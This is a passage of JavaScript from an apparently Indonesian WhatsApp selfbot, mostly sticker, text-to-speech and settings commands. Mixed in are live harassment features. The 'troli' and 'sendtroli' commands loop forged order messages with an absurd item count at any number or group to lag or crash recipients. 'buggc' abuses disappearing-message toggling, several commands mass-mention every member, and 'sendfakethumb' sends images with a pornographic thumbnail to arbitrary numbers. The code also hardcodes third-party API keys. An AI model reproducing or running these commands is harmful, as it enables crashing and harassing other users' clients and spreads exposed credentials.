							const media = await benny.downloadAndSaveMediaMessage(encmedia, `./src/sticker/${sender}`)
							const packname1 = arg.split('|')[0]
							const author1 = arg.split('|')[1]
							require('./lib/exif.js').createExif(packname1, author1)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./src/sticker/data.exif ./src/sticker/${sender}.webp -o ./src/sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											benny.sendMessage(from, fs.readFileSync(`./src/sticker/${sender}.webp`), sticker, {quoted: adadeh})
											fs.unlinkSync(media)
											fs.unlinkSync(`./src/sticker/${sender}.webp`)
											fs.unlinkSync(`./src/sticker/data.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./src/sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
	case 'takestick':
	if (!isQuotedSticker) return reply('Stiker aja om')
	encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	 media = await benny.downloadAndSaveMediaMessage(encmedia)
		 if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					//  reply(mess.wait())
		anu = args.join(' ').split('|')
		 satu = anu[0] !== '' ? anu[0] : namabot
		dua = typeof anu[1] !== 'undefined' ? anu[1] : ''
	require('./lib/exif.js').createExif(satu, dua)
	require('./lib/exif.js').modStick(media, benny, ben, from)
	if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
							break
							case 'sticknowm':
							case 'stickernowm':
							case 'snowm':
	if (!isQuotedSticker) return reply('Stiker aja om')
	encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	 media = await benny.downloadAndSaveMediaMessage(encmedia)
			reply(mess.wait)
	require('./lib/exif.js').createExif('', '')
	require('./lib/exif.js').modStick(media, benny, ben, from)
							break
							case 'ambil':
							case 'colong':
	if (!isQuotedSticker) return reply('Stiker aja om')
	encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	 media = await benny.downloadAndSaveMediaMessage(encmedia)
	 pe = await media.toString('base64')
			reply(mess.wait)
			anu = ben.message.extendedTextMessage.contextInfo.participant
			anu1 = ben.key.id
			anu2 = ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileEncSha256
			anu3 = ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256
			anu4 = ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.url
			anu5 = ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.mediaKey
			anu6 = ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.directPath
			anu7 = ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.firstFrameLength
			anu8 = ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileLength
				benny.sendMessage(anu, `*Halo kak* ( @${anu.split('@')[0]} )\n*Izin ambil sticker nya yah :)*`, text, { contextInfo: {mentionedJid: [anu]}, quoted: {
    "key": {
      "remoteJid": from,
      "fromMe": false,
      "participant": anu,
      "id": anu1
    },
    "message": {
      "stickerMessage": {
        "fileSha256": anu3,
        "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": anu6,
        "fileLength": anu8,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1617398515",
    "status": "PENDING"
  }
					})
	require('./lib/exif.js').createExif('Wa: 089636006352', 'Menerima jasa pembuatan sticker')
	require('./lib/exif.js').modStick(media, benny, ben, from)
							break
					case 'stiker':
					case 'sticker':
					
						if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
							if (isQuotedImage) encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
							if (ben.message.imageMessage) encmedia = ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia)
							sendSticker(from, media)
						} else if ((isMedia && ben.message.videoMessage.seconds < 30 || isQuotedVideo && ben.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 30) && args.length == 0) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia)
							sendSticker(from, media)
						} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia)
							ranw = getRandom('.webp')
							ranp = getRandom('.png')
							require('./lib/exif.js').createExif(namabot, '')
							reply(mess.wait)
					keyrmbg = 'z7PetGk6n8bJZyaz6xLMX6pg'
							await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp}).then(res => {
								fs.unlinkSync(media)
								let buffer = Buffer.from(res.base64img, 'base64')
								fs.writeFileSync(ranp, buffer, (err) => {
									if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
								})
								exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
									fs.unlinkSync(ranp)
									if (err) return reply(mess.error.stick)
									exec(`webpmux -set exif ./src/sticker/data.exif ${ranw} -o ${ranw}`, async (error) => {
									benny.sendMessage(from, fs.readFileSync(ranw), sticker, {quoted: adadeh})
									})
								})
							})
						} else if ((isMedia || isQuotedImage) && colors.includes(args[0])) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia)
							ran = getRandom('.webp')
							await ffmpeg(`./${media}`)
								.on('start', function (cmd) {
									console.log('Started :', cmd)
								})
								.on('error', function (err) {
									fs.unlinkSync(media)
									console.log('Error :', err)
								})
								.on('end', function () {
									console.log('Finish')
									fs.unlinkSync(media)
									benny.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: adadeh})
									fs.unlinkSync(ran)
								})
								.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=${args[0]}@0.0, split [a][b]; [a] palettegen=reserve_transparent=off; [b][p] paletteuse`])
								.toFormat('webp')
								.save(ran)
						} else if (args.length > 1) {
       reply(mess.wait)
       anu = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${lolkey}&query=${body.slice(9)}`)
  randKey = anu.result[0]
  okelas = randKey.stickers
  diare = okelas[Math.floor(Math.random() * (okelas.length))]
       sendStickerUrl(from, diare)
      			} else {
							reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
						}
						break
				case 'stickergif':
				case 'stikergif':
				
				if ((isMedia && ben.message.videoMessage.seconds < 15 || isQuotedVideo && ben.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 15) && args.length == 0) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia)
							ran = getRandom('.webp')
							reply(mess.wait)
					await ffmpeg(`./${media}`)
								.inputFormat(media.split('.')[1])
								.on('start', function (cmd) {
									console.log(`Started : ${cmd}`)
								})
								.on('error', function (err) {
									console.log(`Error : ${err}`)
									fs.unlinkSync(media)
									tipe = media.endsWith('.mp4') ? 'video' : 'gif'
									reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker`)
								})
								.on('end', function () {
									console.log('Finish')
									benny.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: adadeh})
									fs.unlinkSync(media)
									fs.unlinkSync(ran)
								})
								.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
								.toFormat('webp')
								.save(ran)
						}
						break
				case 'tts':
				
					if (args.length < 1) return benny.sendMessage(from, 'Diperlukan Code bahasa kak, Contoh ${prefix}gtts id [text kakak](•‿•)', text, {quoted: adadeh})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return benny.sendMessage(from, '𝗧𝗲𝗸𝘀 𝘆𝗮𝗻𝗴 𝗺𝗮𝘂 𝗱𝗶𝗷𝗮𝗱𝗶𝗶𝗻 𝘀𝘂𝗮𝗿𝗮 𝗺𝗮𝗻𝗮 𝘁𝗼𝗱? 𝘁𝘆𝘁𝗱 𝗸𝗮𝗵?', text, {quoted: adadeh})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 300
					? reply('𝗜𝗱𝗶𝗵 𝗻𝗴𝗲𝗹𝘂𝗻𝗷𝗮𝗸 𝗻𝗴𝗲𝗻𝘁𝗼𝗱, 𝘁𝗲𝗸𝘀𝗻𝘆𝗮 𝗷𝗮𝗻𝗴𝗮𝗻 𝗸𝗲𝗽𝗮𝗻𝗷𝗮𝗻𝗴𝗮𝗻 😤')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buff = fs.readFileSync(rano)
							if (err) return reply('𝗬𝗲𝗮𝗵 𝗴𝗮𝗴𝗮𝗹 ;(, 𝘂𝗹𝗮𝗻𝗴𝗶 𝗹𝗮𝗴𝗶 𝘆𝗮𝗵 𝘁𝗼𝗱 ^_^')
							benny.sendMessage(from, buff, audio, {"quoted": ben, "duration": 359996400, "ptt":true})
							fs.unlinkSync(rano)
						})
					})
					break
					case 'public':
				   if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			if (banChats === false) return
					banChats = false
					benny.sendMessage(from, `「 *PUBLICMODE* 」`, text, {quoted: adadeh})
					break
				case 'self':
				    if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			if (banChats === true) return
					banChats = true
					benny.sendMessage(from, `「 *SELFMODE* 」`, text, {quoted: adadeh})
  break
  case 'offline':
				    if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			if (args.length < 1) return reply('Apa alasan bot offline?')
					if (banChat === true) return
					banChat = true
					alasanoff = body.slice(9)
				benny.sendMessage(from, `*Sucess offline!*\n*Alasan* : ${alasanoff}\n*Waktu:* ${time}`, text, {quoted: adadeh})
  break
  case 'setgrup':
  case 'setgroup':
				    if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			       setgrup = `${args[0]}`
				   reply(`*Berhasil mengubah fake reply grup!*`)
				   break
  case 'thumbtoimg':
  case 'thumbtoimage':
  
  encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.extendedTextMessage.jpegThumbnail
  media = Buffer.from(encmedia, 'base64')
  benny.sendMessage(from, media, image, {quoted: adadeh, caption: 'Neh..'})
  break
  case 'virgam':

if (!isGroup) return reply(mess.only.group)
if (isMedia || isQuotedImage) {
	members_id = []
		for (let mem of _level){
					members_id.push(mem.jid)
					}
				encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				benny.sendMessage(from, fs.readFileSync(media), image, {contextInfo: {"mentionedJid": members_id}})
}
				break
  case 'virgam2':

if (!isGroup) return reply(mess.only.group)
if (isMedia || isQuotedImage) {
	members_id = []
		for (let mem of _level){
					members_id.push(mem.jid)
					}
				encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				benny.sendMessage('status@broadcast', fs.readFileSync(media), image, {contextInfo: {"mentionedJid": members_id}})
}
				break
							case 'viraudio':

	members_id = []
		for (let mem of _level){
					members_id.push(mem.jid)
					}
				encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
				benny.sendMessage(from, anu, audio, {contextInfo: {"mentionedJid": members_id}, ptt: true})
break
case 'virstick':

if (!isGroup) return reply(mess.only.group)
if (isQuotedSticker) {
	members_id = []
		for (let mem of _level){
					members_id.push(mem.jid)
					}
				encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
				benny.sendMessage(from, anu, sticker, {contextInfo: {"mentionedJid": members_id}})
} else if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia)
							members_id = []
		for (let mem of _level){
					members_id.push(mem.jid)
					}
							ran = getRandom('.webp')
							require('./lib/exif').createExif(namabot, '')
							await ffmpeg(`./${media}`)
								.input(media)
								.on('start', function (cmd) {
									console.log(`Started : ${cmd}`)
								})
								.on('error', function (err) {
									console.log(`Error : ${err}`)
									fs.unlinkSync(media)
									reply(mess.error.stick)
								})
								.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./src/data.exif ${ran} -o ${ran}`, async (error) => {
									if (error) return reply(mess.error.stick)
                                benny.sendMessage(from, fs.readFileSync(ran), sticker, {contextInfo: {"mentionedJid": members_id}, quoted: adadeh})
									fs.unlinkSync(media)	
									fs.unlinkSync(ran)
								})
								})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
						} else if (args.length > 1) {
							members_id = []
		for (let mem of _level){
					members_id.push(mem.jid)
					}
							pngttp = './temp/ttp.png'
							webpng = './temp/ttp.webp'
							require('./lib/exif').createExif(namabot, '')
							const ttptext = body.slice(10)
							fetch(`https://api.areltiyan.site/sticker_maker?text=${ttptext}`, { method: 'GET'})
							.then(async res => {
							const ttptxt = await res.json()
							base64Img.img(ttptxt.base64, 'temp', 'ttp', function(err, filepath) {
							if (err) return console.log(err);
							exec(`webpmux -set exif ./src/data.exif ${webpng} -o ${webpng}`, async (error) => {
							exec(`ffmpeg -i ${pngttp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${webpng}`, (err) => {
							buffer = fs.readFileSync(webpng)
							benny.sendMessage(from, buffer, sticker, {quoted: adadeh})
							fs.unlinkSync(webpng)
							fs.unlinkSync(pngttp)
							})
							})
							})
							});
						} else {
							reply(`Reply sticker/gambar dengan tulisan\n${prefix}`)
						}
	break
  case 'virtex':
  nihyak = []
  for (let o of _level) {
  nihyak.push(o.jid)
			}
			benny.sendMessage(from, 'Virtex bang?', text, {contextInfo: {mentionedJid: nihyak}})
			break
  case 'virsw':
  nihyak = []
  for (let o of _level) {
  nihyak.push(o.jid)
			}
			benny.sendMessage('status@broadcast', 'tes', text, {contextInfo: {mentionedJid: nihyak}})
			break
  case 'fakethumb':
  case 'fakethumbnail':
  
  if (!isQuotedImage) return reply('Reply gambarnya!')
				if ((isMedia || isQuotedImage) && args.length == 0) 
ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
media = await benny.downloadAndSaveMediaMessage(ger)
benny.sendMessage(from, fs.readFileSync(media), image, {thumbnail: fs.readFileSync("./src/bokep.jpg")})
break
case 'stickfakethumb':
  
  if (!isQuotedSticker) return reply('Reply stickernya!') 
ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await benny.downloadAndSaveMediaMessage(ger)
benny.sendMessage(from, fs.readFileSync(media), sticker, {thumbnail: fs.readFileSync("./src/sticker/keseltag.webp")})
break
 case 'sendfakethumb':
 
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if (isMedia || isQuotedImage)
			bodom = new RegExp('[-+/ +/()]', 'gi')
				bodo = body.slice(15)
				teks = bodo.replace(bodom, '')
			targeten = `${teks}@s.whatsapp.net`
ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
media = await benny.downloadAndSaveMediaMessage(ger)
benny.sendMessage(targeten, fs.readFileSync(media), image, {thumbnail: fs.readFileSync("./src/bokep.jpg")})
break
  case 'setthumb':
  case 'setthumbnail':
  
				    if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			if ((isMedia || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
const ehgmediab = await benny.downloadAndSaveMediaMessage(ger)
nihiyab = await imageToBase64(ehgmediab)
setthumb = `${nihiyab}` 
					reply(`*Sukses mengubah thumbnail fake reply*`)
			} else if (isQuotedSticker) {
				encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
			setthumb = anu
			reply(`*Sukses mengubah thumbnail fake reply*`)
			}
					break
					case 'setppgc':
					case 'setppgroup':
					case 'setppgrup':
					if ((isMedia || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
ehgmediabi = await benny.downloadAndSaveMediaMessage(ger)
benny.updateProfilePicture(from, ehgmediabi)
reply(`*Sukses mengubah profile picture*`)
			} else if (isQuotedSticker) {
ran = getRandom('.png')
ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ehgmediabi = await benny.downloadAndSaveMediaMessage(ger)
exec(`ffmpeg -i ${ehgmediabi} ${ran}`, (err) => {
benny.updateProfilePicture(from, ran)
reply(`*Sukses mengubah profile picture*`)
})
			} else {
				reply('Gunakan gambar!')
			}
			break
					case 'setpp':
					case 'setppbot':
					
				    if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			if ((isMedia || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
ehgmediabi = await benny.downloadAndSaveMediaMessage(ger)
benny.updateProfilePicture(botNumber, ehgmediabi)
reply(`*Sukses mengubah profile picture*`)
			} else if (isQuotedSticker) {
ran = getRandom('.png')
ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ehgmediabi = await benny.downloadAndSaveMediaMessage(ger)
exec(`ffmpeg -i ${ehgmediabi} ${ran}`, (err) => {
benny.updateProfilePicture(botNumber, ran)
reply(`*Sukses mengubah profile picture*`)
})
			} else {
				reply('Gunakan gambar!')
			}
break
  case 'online':
  
				    if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			if (banChat === false) return
					banChat = false
				benny.sendMessage(from, `*Sucess online!*`, text, {quoted: adadeh})
  break
				case 'owner':
				if (args.length < 1) {
					for (let i = 0; i < ownerNumber.length; i++ ) {
						apo = await getName(ownerNumber[i]) || 'OWNER BOT'
					const vcard = 'BEGIN:VCARD\n'
            + `VERSION:3.0\n`
            + `FN:${apo} \n` // GANTI NAMA LU
            + `ORG:${apo};\n`
            + `TEL;type=CELL;type=VOICE;waid=${ownerNumber[i].replace('@s.whatsapp.net', '')}:+${ownerNumber[i].replace('@s.whatsapp.net', '')}\n` // GANTI NOMOR LU
            + `END:VCARD`
			anub = await benny.sendMessage(from, {displayName: apo, vcard: vcard}, contact, {quoted: adadeh})
			benny.sendMessage(from, { text:'Tuh owner saia',jpegThumbnail: setthumb}, extendedText, {quoted: anub})
					}
				} else if (args.length > 1) {
if (!ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			if (args[0] == 'add') {
			ownerNumber.push(`${args[1]}@s.whatsapp.net`)
			fs.writeFileSync('./setting.json', JSON.stringify(ownerNumber))
			reply('Done..')
			}
				} else if (args.length > 1) {
if (!ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			if (args[0] == 'del') {
			ownerNumber.splice(`${args[1]}@s.whatsapp.net`, 1)
			fs.writeFileSync('./setting.json', JSON.stringify(ownerNumber))
			reply('Done..')
			}
				}
			break
case 'premium':
				
if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			const ar = body.split(' ')
                if (ar[1] == 'add') {
                        premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
                        reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
                } else if (ar[1] == 'del') {
					 _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
                        fs.writeFileSync('./src/premium.json', JSON.stringify(_premium))
                        reply('Sudah selesai')
                } else {
                    reply('Format salah!')
                }
            break
			case 'sewa':
				
if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
                if (args[0] == 'add') {
                        sewa.addPremiumUser(from, args[1], _sewa)
                        reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${from}\n➸ *Expired*: ${ms(toMs(args[1])).days} day(s) ${ms(toMs(args[1])).hours} hour(s) ${ms(toMs(args[1])).minutes} minute(s)`)
                } else if (args[0] == 'del') {
					 _premium.splice(premium.getPremiumPosition(from, _premium), 1)
                        fs.writeFileSync('./src/sewa.json', JSON.stringify(_sewa))
                        reply('Sudah selesai')
                } else {
                    reply('Format salah!')
                }
            break
				case 'translate':
			
			teks = body.slice(11)
			ok1 = teks.split('|')[0]
			ok2 = teks.split('|')[1]
			anu = await translate(ok2, {to: ok1})
			console.log(anu)
				    reply(anu.text)
					break
					case 'buggc':
					if (!ben.key.fromMe && !isOwner) return
					benny.toggleDisappearingMessages(from, '🙄')
					break
					case 'troli':
					for (let i = 0; i < args[0]; i++) {
				anu = await benny.sendMessage(from, 'Tes', text, {contextInfo: { participant: '0@s.whatsapp.net', quotedMessage: {orderMessage: {itemCount: teroli, status: 0, surface: 0, orderTitle: 'Benny', sellerJid: '0@s.whatsapp.net'} } } })
				benny.clearMessage(anu.key)
					}
				break
					case 'sendtroli':
					if (args[0] == 'gc') targ = '@g.us'
					if (args[0] == 'pc') targ = '@s.whatsapp.net'
					polo = body.slice(15)
					bodom = new RegExp('[-+/ +/()]', 'gi')
					polo1 = polo.split('|')[0]
					polo2 = polo.split('|')[1]
					for (let o = 0; o < polo2; o++) {
				anu = await benny.sendMessage(polo1.replace(bodom, '') + targ, 'Tes', text, {quoted: {key: {remoteJid: numbernye}, message: {orderMessage: {itemCount: 9999999999999, status: '🙄', surface: '🙄', orderTitle: 'Benny', sellerJid: '0@s.whatsapp.net'} } } })
					benny.clearMessage(anu.key)
					}
					break
					case 'scraphtml':
			anu = await axios.get(args[0])
				    reply(anu.data)
					break
					case 'urltostick':
				case 'urltosticker':
				
				if (args.length < 1) return reply('Link nya mana block')
				anu = body.slice(10)
				buffer = await getBaper(anu)
				benny.sendMessage(from, buffer, sticker, {quoted: adadeh})
				break
				case 'urltoimg':
				case 'urltoimage':
				
				if (args.length < 1) return reply('Link nya mana block')
				anu = body.slice(10)
				buffer = await getBaper(anu)
				benny.sendMessage(from, buffer, image, {quoted: adadeh})
					break
					case 'citacita':
                    var xzyppp = fs.readFileSync('./src/citacita.json')
                    var ditiin = JSON.parse(xzyppp)
                    var rwscwx = Math.floor(Math.random() * ditiin.length)
                    var rin421 = ditiin[rwscwx]
					buffer = await getBaper(rin421.citacita)
                    benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', ptt: true})
                    break
					case 'revoke':
					revokeLink(from)
					break
					case 'jadiadmin':
					jadiAdmin(from, [sender])
					break
					case 'join':
					if (args.length == 1) {
					joinGroup(body.slice(6), (err) => {
						if (err) return reply('Link Group Tidak Valid!')
					})
			} else {
				reply('Masukan Url Group!')
			}
break
				case 'status':
				if (banChats == true) return reply(`「 *SELFMODE* 」 \n *Status:* _*SELF*_`)
				if (banChats == false) return reply(`「 *SELFMODE* 」 \n *Status:* _*PUBLIC*_`)
					break
					case 'setmultiprefix':
					case 'setmprefix':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			      	prefix = ''
					reply('Prefix berhasil di set ke multi prefix!')
					break
				case 'setprefix':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			      	if (args.length < 1) return
					prefix = args[0]
					benny.sendMessage(from, `Prefix berhasil di ubah menjadi : ${prefix}`, text, {quoted: adadeh})
					break
				case 'upswmeme':
                            if (isMedia && !ben.message.videoMessage || isQuotedImage) {
								teks = body.slice(10)
                                top = teks.split('|')[0]
                                bottom = teks.split('|')[1]
                                encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace("quotedM","m")).message.extendedTextMessage.contextInfo : ben
                                media = await benny.downloadAndSaveMediaMessage(encmedia)
                                var imgbb = require('imgbb-uploader')
					data = await imgbb("cedeb44b8d204947a6833ca1412ca77d", media)
                                memeRes = await getBaper(`https://pecundang.herokuapp.com/api/memegen1?teks=${top}&img_url=${data.display_url}`)
								fs.writeFileSync('./src/upswmeme.png', memeRes)
                                benny.sendMessage(from, memeRes, image, {quoted: adadeh, caption: 'Ini meme nya'})
                                benny.sendMessage('status@broadcast', fs.readFileSync('./src/upswmeme.png'), image, {quoted: adadeh, caption: bottom})
                            }
                            break
				case 'upswmeme2':
                            if (isMedia && !ben.message.videoMessage || isQuotedImage) {
								teks = body.slice(10)
                                top = teks.split('|')[0]
                                bottom = teks.split('|')[1]
                                encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace("quotedM","m")).message.extendedTextMessage.contextInfo : ben
                                media = await benny.downloadAndSaveMediaMessage(encmedia)
                                var imgbb = require('imgbb-uploader')
					data = await imgbb("cedeb44b8d204947a6833ca1412ca77d", media)
                                memeRes = await getBaper(`https://pecundang.herokuapp.com/api/memegen3?teks=${top}&img_url=${data.display_url}`)
								fs.writeFileSync('./src/upswmeme2.png', memeRes)
